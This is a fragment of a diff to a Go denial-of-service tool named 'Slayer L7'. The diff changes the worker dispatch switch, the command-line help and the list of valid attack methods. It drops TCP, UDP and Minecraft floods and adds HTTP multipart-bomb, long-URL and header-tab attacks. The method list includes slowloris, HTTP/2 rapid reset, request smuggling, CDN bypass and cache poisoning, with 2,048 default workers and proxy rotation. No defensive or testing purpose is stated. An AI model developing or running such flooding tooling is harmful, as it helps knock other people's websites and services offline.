-        case "tcp_fragmented":
-            err = tcpFragmented(targetURL, stop)
-        case "tcp_large_connect":
-            err = tcpLargeConnect(targetURL, stop)
         case "http_event_stream":
             err = httpEventStream(targetURL, client, stop)
         case "http_poll":
@@ -6587,12 +3877,16 @@ func Worker(id int, targetURL string, method string, clients []*http.Client, sto
             err = httpMixRegex(targetURL, client)
         case "mixchunked":
             err = httpMixChunkedSlow(targetURL, client, stop)
-        case "rapidreset_adv":
-            err = httpRapidResetAdvanced(targetURL, stop)
         case "cachebypass":
             err = httpCacheBypass(targetURL, client)
         case "slowpost_bomb":
             err = httpSlowPostBomb(targetURL, client, stop)
+        case "http_multipart_bomb":
+            err = httpMultipartBomb(targetURL, client)
+        case "http_long_url":
+            err = httpLongURL(targetURL, client)
+        case "http_header_tab":
+            err = httpHeaderTab(targetURL, client)
         default:
             fmt.Fprintf(os.Stderr, "\n  unknown method: %s\n", method)
             os.Exit(1)
@@ -6610,7 +3904,7 @@ func Worker(id int, targetURL string, method string, clients []*http.Client, sto
 
 func main() {
     target := flag.String("t", "", "target URL (e.g. http://1.2.3.4)")
-    method := flag.String("m", "httpget", "method: httpget, httppost, rudy, apiflood, rapidreset, wsflood, slowloris, headerflood, mixpost, cfbypass, range, cookiebomb, chunkpost, malformed, h2continuation, graphql_batch, zstd_bomb, redos, cache_poison, smuggle_clte, pingback, tcp_connect, tcp_slow, tcp_payload, udp_flood, mc_ping, mc_bot, mc_bigpacket, mc_legacy, mc_nullping, mc_handshake_flood, mc_hold, mc_data, httpoptions, httpdelete, httpput, httphead, xss_probe, sqli_probe, path_traversal, smuggle_tete, dns_query, icmp_flood, ack_flood, syn_flood, mc_ext_login, mc_bungee, mc_varint, mc_ping_var, mc_data_spam, mc_profile_flood, http_empty, http_invalid_req, http_ghost, http_frag, http_header_split, http_ssrf, http_slow_read, http_invalid_hdr, http_rapid_connect, http_auth, http_h2_flood, udp_amp, http_json, http_multipart, http_conn_smuggle, http_long_hdr, http_cache_maxage, http_dead_conn, http_bad_start, http_form_bomb, http_ntlm, mc_account_fill, mc_spam_pkt, mc_bad_pkt, mc_random_pkt, mc_slow_read, tcp_socket_exhaust, dns_nx, udp_dns, udp_memcached, icmp_large, tcp_urg, tcp_oob, tcp_fin, tcp_half_open, tcp_fragmented, tcp_large_connect, http_event_stream, http_poll, http_payload, h2_window, graphql_recursion, h2_cont_bomb, mixheavy, mixbunchof, mixregex, mixchunked, rapidreset_adv, cachebypass, slowpost_bomb")
+    method := flag.String("m", "httpget", "method: httpget, httppost, rudy, apiflood, rapidreset_adv, wsflood, slowloris, headerflood, mixpost, cfbypass, range, cookiebomb, chunkpost, malformed, h2continuation, graphql_batch, zstd_bomb, redos, cache_poison, smuggle_clte, pingback, httpoptions, httpdelete, httpput, httphead, xss_probe, sqli_probe, path_traversal, smuggle_tete, http_empty, http_invalid_req, http_ghost, http_frag, http_header_split, http_ssrf, http_slow_read, http_invalid_hdr, http_rapid_connect, http_auth, http_h2_flood, http_json, http_multipart, http_conn_smuggle, http_long_hdr, http_cache_maxage, http_dead_conn, http_bad_start, http_form_bomb, http_ntlm, http_event_stream, http_poll, http_payload, h2_window, graphql_recursion, h2_cont_bomb, mixheavy, mixbunchof, mixregex, mixchunked, cachebypass, slowpost_bomb, http_multipart_bomb, http_long_url, http_header_tab")
     workerCount := flag.Int("w", 2048, "number of workers")
     dur := flag.Int("d", 30, "duration in seconds")
     pFile := flag.String("p", "", "proxy file path (optional, direct if omitted)")
@@ -6621,7 +3915,7 @@ func main() {
     if *target == "" {
         fmt.Println("Slayer L7")
         fmt.Println("\n  Usage: slayer -t <url> [-m method] [-w workers] [-d duration] [-p proxyfile]")
-        fmt.Println("  Methods: httpget | httppost | rudy | apiflood | rapidreset | wsflood | slowloris | headerflood | mixpost | cfbypass | range | cookiebomb | chunkpost | malformed | h2continuation | graphql_batch | zstd_bomb | redos | cache_poison | smuggle_clte | pingback | tcp_connect | tcp_slow | tcp_payload | udp_flood | mc_ping | mc_bot | mc_bigpacket | mc_legacy | mc_nullping | mc_handshake_flood | mc_hold | mc_data | httpoptions | httpdelete | httpput | httphead | xss_probe | sqli_probe | path_traversal | smuggle_tete | dns_query | icmp_flood | ack_flood | syn_flood | mc_ext_login | mc_bungee | mc_varint | mc_ping_var | mc_data_spam | mc_profile_flood | http_empty | http_invalid_req | http_ghost | http_frag | http_header_split | http_ssrf | http_slow_read | http_invalid_hdr | http_rapid_connect | http_auth | http_h2_flood | udp_amp | http_json | http_multipart | http_conn_smuggle | http_long_hdr | http_cache_maxage | http_dead_conn | http_bad_start | http_form_bomb | http_ntlm | mc_account_fill | mc_spam_pkt | mc_bad_pkt | mc_random_pkt | mc_slow_read | tcp_socket_exhaust | dns_nx | udp_dns | udp_memcached | icmp_large | tcp_urg | tcp_oob | tcp_fin | tcp_half_open | tcp_fragmented | tcp_large_connect | http_event_stream | http_poll | http_payload | h2_window | graphql_recursion | h2_cont_bomb | mixheavy | mixbunchof | mixregex | mixchunked | rapidreset_adv | cachebypass | slowpost_bomb")
+        fmt.Println("  Methods: httpget | httppost | rudy | apiflood | rapidreset_adv | wsflood | slowloris | headerflood | mixpost | cfbypass | range | cookiebomb | chunkpost | malformed | h2continuation | graphql_batch | zstd_bomb | redos | cache_poison | smuggle_clte | pingback | httpoptions | httpdelete | httpput | httphead | xss_probe | sqli_probe | path_traversal | smuggle_tete | http_empty | http_invalid_req | http_ghost | http_frag | http_header_split | http_ssrf | http_slow_read | http_invalid_hdr | http_rapid_connect | http_auth | http_h2_flood | http_json | http_multipart | http_conn_smuggle | http_long_hdr | http_cache_maxage | http_dead_conn | http_bad_start | http_form_bomb | http_ntlm | http_event_stream | http_poll | http_payload | h2_window | graphql_recursion | h2_cont_bomb | mixheavy | mixbunchof | mixregex | mixchunked | cachebypass | slowpost_bomb | http_multipart_bomb | http_long_url | http_header_tab")
         fmt.Println()
         flag.PrintDefaults()
         os.Exit(1)
@@ -6633,25 +3927,18 @@ func main() {
     proxyFile := *pFile
 
     validMethods := map[string]bool{
-        "httpget": true, "httppost": true, "rudy": true, "apiflood": true, "rapidreset": true, "wsflood": true,
+        "httpget": true, "httppost": true, "rudy": true, "apiflood": true, "rapidreset_adv": true, "wsflood": true,
         "slowloris": true, "headerflood": true, "mixpost": true, "cfbypass": true, "range": true, "cookiebomb": true,
         "chunkpost": true, "malformed": true, "h2continuation": true, "graphql_batch": true, "zstd_bomb": true,
-        "redos": true, "cache_poison": true, "smuggle_clte": true, "pingback": true, "tcp_connect": true, "tcp_slow": true, "tcp_payload": true, "udp_flood": true,
-        "mc_ping": true, "mc_bot": true, "mc_bigpacket": true, "mc_legacy": true, "mc_nullping": true, "mc_handshake_flood": true, "mc_hold": true, "mc_data": true,
-        "httpoptions": true, "httpdelete": true, "httpput": true, "httphead": true, "xss_probe": true, "sqli_probe": true,
-        "path_traversal": true, "smuggle_tete": true, "dns_query": true, "icmp_flood": true, "ack_flood": true, "syn_flood": true,
-        "mc_ext_login": true, "mc_bungee": true, "mc_varint": true, "mc_ping_var": true, "mc_data_spam": true, "mc_profile_flood": true,
+        "redos": true, "cache_poison": true, "smuggle_clte": true, "pingback": true, "httpoptions": true, "httpdelete": true,
+        "httpput": true, "httphead": true, "xss_probe": true, "sqli_probe": true, "path_traversal": true, "smuggle_tete": true,
         "http_empty": true, "http_invalid_req": true, "http_ghost": true, "http_frag": true, "http_header_split": true,
         "http_ssrf": true, "http_slow_read": true, "http_invalid_hdr": true, "http_rapid_connect": true, "http_auth": true,
-        "http_h2_flood": true, "udp_amp": true, "http_json": true, "http_multipart": true, "http_conn_smuggle": true,
-        "http_long_hdr": true, "http_cache_maxage": true, "http_dead_conn": true, "http_bad_start": true, "http_form_bomb": true,
-        "http_ntlm": true, "mc_account_fill": true, "mc_spam_pkt": true, "mc_bad_pkt": true, "mc_random_pkt": true,
-        "mc_slow_read": true, "tcp_socket_exhaust": true, "dns_nx": true, "udp_dns": true, "udp_memcached": true,
-        "icmp_large": true, "tcp_urg": true, "tcp_oob": true, "tcp_fin": true, "tcp_half_open": true,
-        "tcp_fragmented": true, "tcp_large_connect": true, "http_event_stream": true, "http_poll": true, "http_payload": true,
-        "h2_window": true, "graphql_recursion": true, "h2_cont_bomb": true,
-        "mixheavy": true, "mixbunchof": true, "mixregex": true, "mixchunked": true,
-        "rapidreset_adv": true, "cachebypass": true, "slowpost_bomb": true,
+        "http_h2_flood": true, "http_json": true, "http_multipart": true, "http_conn_smuggle": true, "http_long_hdr": true,
+        "http_cache_maxage": true, "http_dead_conn": true, "http_bad_start": true, "http_form_bomb": true, "http_ntlm": true,
+        "http_event_stream": true, "http_poll": true, "http_payload": true, "h2_window": true, "graphql_recursion": true,
+        "h2_cont_bomb": true, "mixheavy": true, "mixbunchof": true, "mixregex": true, "mixchunked": true,
+        "cachebypass": true, "slowpost_bomb": true, "http_multipart_bomb": true, "http_long_url": true, "http_header_tab": true,
     }
     if !validMethods[strings.ToLower(*method)] {
         fmt.Fprintf(os.Stderr, "\n  \033[31m✗\033[0m Unknown method: %s\n", *method)
@@ -6660,7 +3947,7 @@ func main() {
 
     needsClientPool := true
     switch strings.ToLower(*method) {
-    case "rapidreset", "wsflood", "slowloris", "malformed", "h2continuation", "smuggle_clte", "tcp_connect", "tcp_slow", "tcp_payload", "udp_flood", "mc_ping", "mc_bot", "mc_bigpacket", "mc_legacy", "mc_nullping", "mc_handshake_flood", "mc_hold", "mc_data", "smuggle_tete", "dns_query", "icmp_flood", "ack_flood", "syn_flood", "mc_ext_login", "mc_bungee", "mc_varint", "mc_ping_var", "mc_data_spam", "mc_profile_flood", "http_invalid_req", "http_ghost", "http_frag", "http_invalid_hdr", "http_rapid_connect", "http_h2_flood", "udp_amp", "http_conn_smuggle", "http_long_hdr", "http_bad_start", "mc_account_fill", "mc_spam_pkt", "mc_bad_pkt", "mc_random_pkt", "mc_slow_read", "tcp_socket_exhaust", "dns_nx", "udp_dns", "udp_memcached", "icmp_large", "tcp_urg", "tcp_oob", "tcp_fin", "tcp_half_open", "tcp_fragmented", "tcp_large_connect", "h2_window", "h2_cont_bomb", "mixchunked", "rapidreset_adv":
+    case "rapidreset_adv", "wsflood", "slowloris", "malformed", "h2continuation", "smuggle_clte", "smuggle_tete", "http_invalid_req", "http_ghost", "http_frag", "http_invalid_hdr", "http_rapid_connect", "http_h2_flood", "http_conn_smuggle", "http_long_hdr", "http_bad_start", "h2_window", "h2_cont_bomb", "mixchunked", "slowpost_bomb":
         needsClientPool = false
     }
 
